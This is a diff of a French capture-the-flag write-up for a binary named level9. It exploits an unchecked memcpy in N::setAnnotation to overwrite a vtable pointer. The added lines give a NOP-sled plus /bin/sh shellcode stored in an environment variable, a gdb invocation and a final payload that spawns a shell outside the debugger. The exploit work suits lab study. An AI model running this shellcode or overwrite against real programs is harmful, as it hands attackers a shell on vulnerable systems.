@@ -1,12 +1,20 @@
 On voit un appel non protégé de memcpy dans la fonction membre N::setAnnotation. On peut s'en servir pour ecraser le pointeur vers la vtable du second objet vers une adresse arbitraire.
 
-On le fait pointer vers une adresse de notre environnement qui contiendra l'adresse d'un shellcode, lui meme contenu dans l;environnement.
+On le fait pointer vers une adresse dans le buffer qui contiendra l'adresse d'un shellcode, lui meme contenu dans l;environnement.
 
-On va donc creer une variable d'environnement qui contiendra un shellcode suivi d'une adresse dans le nop sled le précédent.
-Apres ce shellcode on mettra un "jump sled", ce qui est donc une suite de pointeurs vers notre shellcode.
+On va donc creer une variable d'environnement qui contiendra un shellcode
+export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
 
-En parametre on n'aura qu'à preciser à notre payload l'adresse d'un de ces pointeurs, adresse trouvée grace à gdb.
+Le payload sera :
+108 * 'a'
+l'addresse + 4 dans le buffer
+L'adresse du shellcode
 
-On trouve ausis grace à gdb que l'offset entre l'annotation et l'adresse de la vtable du second objet est de 0x68. On peut donc simplement donner cela comme parametre :\
+On trouve ausis grace à gdb que l'offset entre l'annotation et l'adresse de la vtable du second objet est de 0x68. On peut donc simplement donner cela comme parametre :
 
-python -c "print 'a' * 108 + '\c5''\xff''\xff''\xbf'"
+gdb --args /home/user/level9/level9 `python -c "print 'a' * 108 + '\xcf\xd1\xff\xbf' + '\xfe\xf8\xff\xbf'"`
+
+
+En tatonnant, on trouve ce qu'il faut adapater pour exploiter le binaire hors de gdb :
+
+/home/user/level9/level9 `python -c "print 'a' * 108 + '\xbf\xd1\xff\xbf' + '\xfe\xf8\xff\xbf'"`
